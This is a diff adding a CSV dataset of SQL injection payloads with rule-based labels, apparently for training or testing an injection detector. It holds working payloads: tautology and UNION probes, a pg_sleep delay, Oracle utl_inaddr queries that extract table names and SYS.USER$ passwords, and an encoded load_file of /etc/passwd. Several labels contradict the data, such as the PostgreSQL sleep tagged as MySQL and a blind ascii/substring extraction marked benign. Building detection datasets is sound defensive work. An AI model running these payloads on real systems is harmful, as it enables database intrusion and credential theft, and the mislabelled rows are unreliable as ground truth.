@@ -1,0 +1,31 @@
+row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
+0,""" or pg_sleep ( __TIME__ ) --",1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
+1,create user name identified by pass123 temporary tablespace temp default tablespace users;,1,,stacked_queries,generic,0.95,create user detected — stacked_queries injection (priority 3) on generic,rule-based
+2,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( table_name ) FROM ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables ) WHERE LIMIT = 5 ) ) AND 'i' = 'i",1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
+3,"select * from users where id = '1' or @ @1 = 1 union select 1,version ( ) -- 1'",1,,union_based,generic,0.95,"union select, @ @1 = 1 union select detected — union_based injection (priority 7) on generic",rule-based
+4,"select * from users where id = 1 or 1#"" ( union select 1,version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
+5,select name from syscolumns where id = ( select id from sysobjects where name = tablename' ) --,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+6,select * from users where id = 1 +$+ or 1 = 1 -- 1,1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+7,"1; ( load_file ( char ( 47,101,116,99,47,112,97,115,115,119,100 ) ) ) ,1,1,1;",1,,out_of_band,mysql,0.95,load_file ( detected — out_of_band injection (priority 2) on mysql,rule-based
+8,"select * from users where id = '1' or ||/1 = 1 union select 1,version ( ) -- 1'",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
+9,"select * from users where id = '1' or \.<\ union select 1,@@VERSION -- 1'",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
+10,? or 1 = 1 --,1,,boolean_blind,generic,0.85,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+11,) or ( 'a' = 'a,1,,boolean_blind,generic,0.85,) or ( detected — boolean_blind injection (priority 8) on generic,rule-based
+12,admin' or 1 = 1#,1,,boolean_blind,generic,0.85,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+13,"select * from users where id = 1 or "" ( ]"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+14,or 1 = 1 --,1,,boolean_blind,generic,0.85,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+15,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( column_name ) FROM ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns ) WHERE LIMIT = 5 ) ) AND 'i' = 'i",1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
+16,"select * from users where id = '1' %!<@ union select 1,version ( ) -- 1'",1,,union_based,generic,0.95,"union select, @ union select detected — union_based injection (priority 7) on generic",rule-based
+17,"select * from users where id = 1 or ""& ( "" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+18,"select * from users where id = 1 or ""? ( "" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+19,distinct,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+20,select * from users where id = '1' * ( \ ) or 1 = 1 -- 1',1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+21,"1 and ascii ( lower ( substring ( ( select top 1 name from sysobjects where xtype = 'u' ) , 1, 1 ) ) ) > 116",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+22,select * from users where id = 1 or \.<\ or 1 = 1 -- 1,1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+23,"admin"" or ""1"" = ""1""--",1,,boolean_blind,generic,0.95,"or ""1"" = ""1"" detected — boolean_blind injection (priority 8) on generic",rule-based
+24,"select * from users where id = 1 or ""%{"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+25,insert,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+26,"select * from users where id = 1 or 1#""? = 1 or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+27,"select * from users where id = 1 or ""%?"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+28,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( PASSWORD ) FROM ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ ) WHERE LIMIT = 8 ) ) AND 'i' = 'i",1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
+29,"select * from users where id = 1 or ""?#"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
